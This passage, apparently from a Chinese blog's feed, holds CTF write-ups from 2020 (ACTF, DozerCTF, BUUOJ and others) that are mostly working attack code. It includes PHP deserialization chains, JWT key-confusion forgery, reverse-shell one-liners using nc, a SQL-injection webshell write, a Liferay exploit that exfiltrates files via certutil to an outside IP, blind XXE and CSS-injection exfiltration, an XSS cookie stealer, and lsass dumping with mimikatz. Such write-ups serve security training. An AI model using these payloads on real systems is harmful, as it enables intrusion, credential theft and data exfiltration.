class="hljs-title">class</span> <span class="hljs-title">Generator</span>&#123;        <span class="hljs-title">public</span> $<span class="hljs-title">formatters</span> = <span class="hljs-title">array</span>(&quot;<span class="hljs-title">addCollection</span>&quot; =&gt; &quot;<span class="hljs-title">system</span>&quot;);    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>\<span class="hljs-title">ImportConfigurator</span>;    <span class="hljs-variable">$gs</span> = <span class="hljs-keyword">new</span> Symfony\Component\Routing\Loader\Configurator\ImportConfigurator();    <span class="hljs-variable">$gs</span>-&gt;parent = <span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>();    <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$gs</span>);&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>5space</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF小记</title>
    <link href="/2020/06/18/ACTF%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/06/18/ACTF%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>前面是phar反序列化，题目要求不能以phar开头可以这样绕过</p><pre><code class="hljs php">compress.zlib:<span class="hljs-comment">//phar://</span></code></pre><p>但不是所有的函数都支持</p><table><thead><tr><th>受影响的函数</th><th>phar://</th><th>compress.bzip2://phar://</th></tr></thead><tbody><tr><td>fileatime</td><td>√</td><td>×</td></tr><tr><td>file_get_contents</td><td>√</td><td>√</td></tr><tr><td>fileinode</td><td>√</td><td>×</td></tr><tr><td>is_dir</td><td>√</td><td>×</td></tr><tr><td>is_readable</td><td>√</td><td>×</td></tr><tr><td>copy</td><td>√</td><td>√</td></tr><tr><td>filectime</td><td>√</td><td>×</td></tr><tr><td>file</td><td>√</td><td>√</td></tr><tr><td>filemtime</td><td>√</td><td>×</td></tr><tr><td>is_executable</td><td>√</td><td>×</td></tr><tr><td>is_writable</td><td>√</td><td>×</td></tr><tr><td>unlink</td><td>√</td><td>×</td></tr><tr><td>file_exists</td><td>√</td><td>×</td></tr><tr><td>filegroup</td><td>√</td><td>×</td></tr><tr><td>fileowner</td><td>√</td><td>×</td></tr><tr><td>is_file</td><td>√</td><td>×</td></tr><tr><td>is_writeable</td><td>√</td><td>×</td></tr><tr><td>stat</td><td>√</td><td>×</td></tr><tr><td>fopen</td><td>√</td><td>√</td></tr><tr><td>fileperms</td><td>√</td><td>×</td></tr><tr><td>is_link</td><td>√</td><td>×</td></tr><tr><td>parse_ini_file</td><td>√</td><td>√</td></tr><tr><td>readfile</td><td>√</td><td>√</td></tr><tr><td>md5_file</td><td>√</td><td>√</td></tr><tr><td>filesize</td><td>√</td><td>×</td></tr><tr><td>highlight_file</td><td>√</td><td>√</td></tr></tbody></table><h2 id="Pastebin"><a href="#Pastebin" class="headerlink" title="Pastebin"></a>Pastebin</h2><p>jwt伪造 ，算法篡改攻击，因为服务器利用的RS256算法，用的是私钥进行签名，公钥进行验证的。获取到公匙后直接用公匙加密完事</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<span class="hljs-keyword">import</span> base64public = <span class="hljs-string">&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCzq7HbMx8ea370AxU2NhP2uzip\nUgqJgp8FDMWqESMrgGlG60Of8tvLJcu+tEdBFOFSHRZmmk7wm/SdzC+0u+GDgTTq\nnrMH9sT6ScveMuCemLsOACpWK0Z8F7ojACMKBgr6/3dVLs1XwSTtr95k3Zf0oGMb\nAMEI3R3wWGhe0+uWCwIDAQAB\n-----END PUBLIC KEY-----&quot;</span>print(jwt.encode(&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;motemote&quot;</span>,<span class="hljs-string">&quot;priv&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))</code></pre><h2 id="upup"><a href="#upup" class="headerlink" title="upup"></a>upup</h2><p>🐎连上后需要切换用户，可以用python创建流，方便用户切换</p><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></code></pre><p>查看所有用户定时任务</p><pre><code class="hljs shell">for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done</code></pre><p>反弹shell的姿势</p><pre><code class="hljs shell">mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&amp;1; rm /tmp/jvenbd</code></pre><p>tar提权<a href="https://www.cnblogs.com/linuxsec/articles/10701392.html">https://www.cnblogs.com/linuxsec/articles/10701392.html</a></p><pre><code class="hljs shell">echo &#x27;ls&#x27; &gt; shell.sh;chmod +x shell.shecho &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;echo &gt; &quot;--checkpoint=1&quot;</code></pre><p><a href="https://github.com/CSUAuroraLab/ACTF2020">https://github.com/CSUAuroraLab/ACTF2020</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ACTFCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DozerCTF2020</title>
    <link href="/2020/06/15/DozerCTF2020/"/>
    <url>/2020/06/15/DozerCTF2020/</url>
    
    <content type="html"><![CDATA[<h2 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h2><p>url二次编码+叠堆注入</p><p>现 show table  出 uziuzi表，然后读一下表出flag</p><p><a href="http://118.31.11.216:30501/?id=1%2527%253Bhandler%2520uziuzi%2520open%2520as%2520GS%253Bhandler%2520GS%2520read%2520first%253B%2523">http://118.31.11.216:30501/?id=1%2527%253Bhandler%2520uziuzi%2520open%2520as%2520GS%253Bhandler%2520GS%2520read%2520first%253B%2523</a></p><h2 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a>白给的反序列化</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">home</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;method = <span class="hljs-variable">$method</span>;        <span class="hljs-keyword">$this</span>-&gt;args = <span class="hljs-variable">$args</span>;    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> home(mysys,<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<span class="hljs-keyword">echo</span>  urlencode(serialize(<span class="hljs-variable">$a</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>传进去，真白给 hhhh</p><h2 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h2><p>第一层盲xxe</p><pre><code class="hljs mojolicious"><span class="xml"># GS.dtd</span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://120.24.42.XXX:4041/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><span class="xml">#1.svg</span><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://120.24.42.XXX:4041/GS.dtd&quot;</span>&gt;</span></span><span class="perl">%remote;%int;%send;</span><span class="xml">]&gt;</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.1&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">rect</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;300&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span></span></span><span class="xml">style=&quot;fill:rgb(0,0,255);stroke-width:1;</span><span class="xml">stroke:rgb(0,0,0)&quot;/&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span></code></pre><p>开一个python起的http服务，我开在4041,在8080端口有个服务，sql注入</p><p>第二层就是写shell，没有过滤 联合注入写一下shell，写道/app目录下</p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">706870206576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">4745545</span>b<span class="hljs-number">315</span>d<span class="hljs-number">293</span>b<span class="hljs-number">3</span>f<span class="hljs-number">3</span>e into outfile &#x27;/app/gs.php&#x27;#</code></pre><p>然后连shell ，读H3re_1s_y0ur_f14g.php  </p><h2 id="简单域渗透-flag1"><a href="#简单域渗透-flag1" class="headerlink" title="简单域渗透-flag1"></a>简单域渗透-flag1</h2><p>CVE-2020-7961 直接打</p><p>参考<a href="https://blog.csdn.net/weixin_45728976/article/details/105819343">https://blog.csdn.net/weixin_45728976/article/details/105819343</a></p><p><strong>LifExp.java</strong>用了一个有回显的</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStreamReader;<span class="hljs-keyword">import</span> java.net.URLEncoder;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LifExp</span> </span>&#123;<span class="hljs-keyword">static</span> &#123;<span class="hljs-keyword">try</span> &#123;            String[] cmd = &#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;type C:\\Users\\root\\Desktop\\flag.txt&quot;</span>&#125;;            Process process=java.lang.Runtime.getRuntime().exec(cmd);            BufferedReader stdInput = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(process.getInputStream()));            String s= stdInput.readLine();            String string = <span class="hljs-string">&quot; &quot;</span>;             <span class="hljs-keyword">while</span> ((string = stdInput.readLine()) != <span class="hljs-keyword">null</span>) &#123;            s = s+string;            &#125;            String encodeStr = URLEncoder.encode(s, <span class="hljs-string">&quot;UTF-8&quot;</span>);            encodeStr = encodeStr.replaceAll(<span class="hljs-string">&quot;\\+&quot;</span>,<span class="hljs-string">&quot;%20&quot;</span>);            String[] cmd2 = &#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;certutil.exe -urlcache -split -f http://120.24.42.XXX:4098/&quot;</span>+encodeStr+<span class="hljs-string">&quot;&quot;</span>&#125;;            java.lang.Runtime.getRuntime().exec(cmd2);        &#125; <span class="hljs-keyword">catch</span> ( Exception e ) &#123;            e.printStackTrace();        &#125;&#125;&#125;</code></pre><h2 id="简单域渗透-flag2"><a href="#简单域渗透-flag2" class="headerlink" title="简单域渗透-flag2"></a>简单域渗透-flag2</h2><p>可以读文件了，然后上的别人的车，上传冰蝎🐎，弹shell回来</p><pre><code class="hljs css"><span class="hljs-selector-tag">procdump64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> <span class="hljs-selector-tag">-ma</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">l</span><span class="hljs-selector-class">.dmp</span><span class="hljs-selector-tag">dump</span>出内存拿下载<span class="hljs-selector-tag">l</span><span class="hljs-selector-class">.dmp</span>到本地<span class="hljs-selector-tag">mimikatz</span> 获取用户密码<span class="hljs-selector-tag">dsquery</span> * <span class="hljs-selector-tag">-d</span> <span class="hljs-selector-tag">dozer</span><span class="hljs-selector-class">.org</span>  <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">shark</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">P</span><span class="hljs-keyword">@ssw0rd</span> -limit <span class="hljs-number">0</span> -attr * &gt; l.txt导出域信息下载下来就能看到flag了</code></pre><p>##fake phpminiadmin</p><p>开始没思路查询数据库有个老哥把他的xss平台上的payload写进去了 对我启发很大（基本上改一下就能用 23333</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c7363726970743e616c6572742831293c2f7363726970743e</span>;<span class="hljs-comment"># &lt;script&gt;alert(1)&lt;/script&gt;</span></code></pre><p>查这个返回数据到页面会导致xss，post下的xss的利用</p><p>构造一个提交页面</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>        // 改成127.0.0.1 是因为那个管理员页面要本地登陆        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;form&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;GS&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/sql.php&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sql&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;select 0xpayload;&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;GS&#x27;</span>).submit();</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>把下面的hex编码 放上面paylaod的地方</p><pre><code class="hljs javascript">&lt;script&gt;(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;(<span class="hljs-keyword">new</span> Image()).src=<span class="hljs-string">&#x27;http://120.24.42.XXX:4099/xss.php?do=api&amp;id=TcsA&amp;location=&#x27;</span>+<span class="hljs-built_in">escape</span>((<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.location.href&#125;<span class="hljs-keyword">catch</span>(e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;)())+<span class="hljs-string">&#x27;&amp;toplocation=&#x27;</span>+<span class="hljs-built_in">escape</span>((<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">return</span> top.location.href&#125;<span class="hljs-keyword">catch</span>(e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;)())+<span class="hljs-string">&#x27;&amp;cookie=&#x27;</span>+<span class="hljs-built_in">escape</span>((<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.cookie&#125;<span class="hljs-keyword">catch</span>(e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;)())+<span class="hljs-string">&#x27;&amp;opener=&#x27;</span>+<span class="hljs-built_in">escape</span>((<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">return</span> (<span class="hljs-built_in">window</span>.opener &amp;&amp; <span class="hljs-built_in">window</span>.opener.location.href)?<span class="hljs-built_in">window</span>.opener.location.href:<span class="hljs-string">&#x27;&#x27;</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;)());&#125;)();<span class="hljs-comment">// 上面一部分是打cookie的，下面是爬管理员网页内容的</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createXmlHttp</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>.XMLHttpRequest) &#123;        xmlHttp = <span class="hljs-keyword">new</span> XMLHttpRequest()    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">var</span> MSXML = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-string">&#x27;MSXML2.XMLHTTP.5.0&#x27;</span>, <span class="hljs-string">&#x27;MSXML2.XMLHTTP.4.0&#x27;</span>, <span class="hljs-string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="hljs-string">&#x27;MSXML2.XMLHTTP&#x27;</span>, <span class="hljs-string">&#x27;Microsoft.XMLHTTP&#x27;</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; MSXML.length; n++) &#123;            <span class="hljs-keyword">try</span> &#123;                xmlHttp = <span class="hljs-keyword">new</span> ActiveXObject(MSXML[n]);                <span class="hljs-keyword">break</span>            &#125; <span class="hljs-keyword">catch</span>(e) &#123;&#125;        &#125;    &#125;&#125;createXmlHttp();xmlHttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">if</span> (xmlHttp.readyState == <span class="hljs-number">4</span>) &#123;        code=<span class="hljs-built_in">escape</span>(xmlHttp.responseText);        createXmlHttp();        url = <span class="hljs-string">&quot;http://120.24.42.XXX:4499&quot;</span>;        cc = <span class="hljs-string">&quot;htmlcode=&quot;</span> + code +<span class="hljs-string">&quot;&amp;filename=index.html&quot;</span>;        xmlHttp.open(<span class="hljs-string">&quot;POST&quot;</span>, url, <span class="hljs-literal">true</span>);        xmlHttp.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);        xmlHttp.send(cc)  &#125;&#125;;xmlHttp.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;/admin_shark.php&quot;</span>, <span class="hljs-literal">true</span>);xmlHttp.setRequestHeader(<span class="hljs-string">&quot;Cookie&quot;</span>, <span class="hljs-string">&quot;PHPSESSID=no1nrugddg335nlufmeu04hfl0&quot;</span>);xmlHttp.send(<span class="hljs-literal">null</span>);&lt;/script&gt;</code></pre><p>参考  <a href="https://www.cnblogs.com/afanti/p/8277344.html">https://www.cnblogs.com/afanti/p/8277344.html</a></p><p>Cookie要根据返回的填，python起的服务不能收post，所以又在4499开了给nc</p><pre><code class="hljs php"><span class="hljs-comment"># python开的服务的回显</span><span class="hljs-number">118.31</span><span class="hljs-number">.11</span><span class="hljs-number">.216</span> - - [<span class="hljs-number">15</span>/Jun/<span class="hljs-number">2020</span> <span class="hljs-number">10</span>:<span class="hljs-number">44</span>:<span class="hljs-number">40</span>] <span class="hljs-string">&quot;GET /xss.php?do=api&amp;id=TcsA&amp;location=http%3A//127.0.0.1/sql.php&amp;toplocation=http%3A//127.0.0.1/sql.php&amp;cookie=PHPSESSID%3Dtjuhvnkki74v7qf4lfp41li347&amp;opener=http%3A//127.0.0.1//admin_shark.php HTTP/1.1&quot;</span> <span class="hljs-number">404</span> -得到了cookie 和后台地址<span class="hljs-comment"># nc监听的回显</span>root@iZwz9f6dy46khk7d55ac01Z:~<span class="hljs-comment"># nc -lvvp 4499</span>Listening on [<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">4499</span>)Connection <span class="hljs-keyword">from</span> [<span class="hljs-number">118.31</span><span class="hljs-number">.11</span><span class="hljs-number">.216</span>] port <span class="hljs-number">4499</span> [tcp<span class="hljs-comment">/*] accepted (family 2, sport 41034)</span><span class="hljs-comment">POST / HTTP/1.1</span><span class="hljs-comment">Host: 120.24.42.229:4499</span><span class="hljs-comment">Connection: keep-alive</span><span class="hljs-comment">Content-Length: 323</span><span class="hljs-comment">Origin: http://127.0.0.1</span><span class="hljs-comment">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><span class="hljs-comment">Content-type: application/x-www-form-urlencoded</span><span class="hljs-comment">Accept: */</span>*Referer: http:<span class="hljs-comment">//127.0.0.1/sql.php</span>Accept-Encoding: gzip, deflatehtmlcode=can%<span class="hljs-number">20</span>you%<span class="hljs-number">20</span>find%<span class="hljs-number">20</span>me%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>Cn127%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">21</span>DOCTYPE%<span class="hljs-number">20</span>html%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Chtml%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Chead%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>Ctitle%<span class="hljs-number">3</span>Eflag%<span class="hljs-number">3</span>C/title%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C/head%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Cbody%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Ch3%<span class="hljs-number">3</span>EAdmin%<span class="hljs-number">20</span>Index%<span class="hljs-number">3</span>A%<span class="hljs-number">3</span>C/h3%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>Ch1%<span class="hljs-number">3</span>EDozerctf%<span class="hljs-number">7</span>Beed8cdc400dfd4ec85dff70a170066b7%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>C/h1%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C/body%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C/html%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A&amp;filename=index.html</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DozerCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些小技巧</title>
    <link href="/2020/06/15/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2020/06/15/%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="python开http服务"><a href="#python开http服务" class="headerlink" title="python开http服务"></a>python开http服务</h1><pre><code class="hljs python">Python &lt;= <span class="hljs-number">2.3</span>python -c <span class="hljs-string">&quot;import SimpleHTTPServer as s; s.test();&quot;</span> <span class="hljs-number">8000</span>Python &gt;= <span class="hljs-number">2.4</span>python -m SimpleHTTPServer <span class="hljs-number">8000</span>Python <span class="hljs-number">3.</span>xpython -m http.server <span class="hljs-number">8000</span></code></pre><p>特别方便</p><h1 id="一种反弹shell的妙招"><a href="#一种反弹shell的妙招" class="headerlink" title="一种反弹shell的妙招"></a>一种反弹shell的妙招</h1><pre><code class="hljs shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f</code></pre><h1 id="curl-find-grep-xargs"><a href="#curl-find-grep-xargs" class="headerlink" title="curl find grep xargs"></a>curl find grep xargs</h1><pre><code class="hljs typescript">curl ip --data <span class="hljs-meta">@flag</span>.txt  带flag出来find /etc  -<span class="hljs-keyword">type</span> f |xargs grep <span class="hljs-string">&quot;flag&#123;&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>xargs 可以组合多个命令</code></pre><p>python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUOJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss?</title>
    <link href="/2020/06/08/xss/"/>
    <url>/2020/06/08/xss/</url>
    
    <content type="html"><![CDATA[<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog</h2><p><a href="https://bugs.php.net/bug.php?id=78814">https://bugs.php.net/bug.php?id=78814</a></p><pre><code class="hljs html">&lt;a/udio id=like href=//http.requestbin.buuoj.cn/x6l5fvx6&gt;aa相当于<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">like</span> <span class="hljs-attr">href</span>=<span class="hljs-string">//http.requestbin.buuoj.cn/x6l5fvx6</span>&gt;</span>aa</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[安洵杯 2019]cssgame</title>
    <link href="/2020/06/06/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-cssgame/"/>
    <url>/2020/06/06/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-cssgame/</url>
    
    <content type="html"><![CDATA[<p>css注入，和南航新生赛有题很像，先给下paylaod</p><pre><code class="hljs html">input[name=flag][value^=&quot;b&quot;] ~ * &#123;background-image: url(&quot;http://x.x.x.x/b&quot;);&#125;</code></pre><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;poc.css&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)flag = <span class="hljs-string">&quot;ac9ec336-62c3-4964-a60e-a55d4b&quot;</span>dic = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;- &quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:        payload = <span class="hljs-string">&#x27;&#x27;&#x27;input[name=flag][value^=&quot;flag&#123;&#x27;&#x27;&#x27;</span>+flag+i+j+<span class="hljs-string">&#x27;&#x27;&#x27;&quot;] ~ * &#123;background-image:url(&quot;http://174.1.183.123:8888/?flag=flag&#123;&#x27;&#x27;&#x27;</span>+flag+i+j+<span class="hljs-string">&#x27;&#x27;&#x27;&quot;);&#125;&#x27;&#x27;&#x27;</span>        f.write(payload + <span class="hljs-string">&quot;\n&quot;</span>)f.close()</code></pre><p>学到了一个新方法，用python起simplehttpserver服务就可以连续接收了，nc只能接收一次</p><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">8000</span></code></pre><p>后面再补qwq</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>css注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[网鼎杯 2020 玄武组]SSRFMe</title>
    <link href="/2020/06/01/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/"/>
    <url>/2020/06/01/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/</url>
    
